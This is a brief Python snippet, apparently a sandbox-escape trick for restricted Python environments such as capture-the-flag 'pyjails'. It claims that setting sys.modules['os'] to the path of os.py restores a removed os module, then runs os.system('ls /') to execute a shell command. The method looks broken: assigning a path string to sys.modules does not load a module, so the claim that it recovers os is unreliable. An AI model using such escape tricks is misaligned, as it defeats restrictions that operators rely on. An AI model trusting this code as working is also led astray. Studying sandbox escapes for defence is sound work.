# if the sandbox remove the module path from module configuration but still keep the file in lib directory, can use this to recover it
# assume '/usr/lib/python3.8/os.py' is correct path for os.py
# if it's not for your environment, can use "print (sys.modules['some basic module'])" to get the library path
# for example "print (sys.modules['base64'])", or you can check on this website: https://docs.python.org/3/py-modindex.html
print (sys.modules["base64"])
sys.modules['os'] = '/usr/lib/python3.8/os.py'
import os
os.system ("ls /")
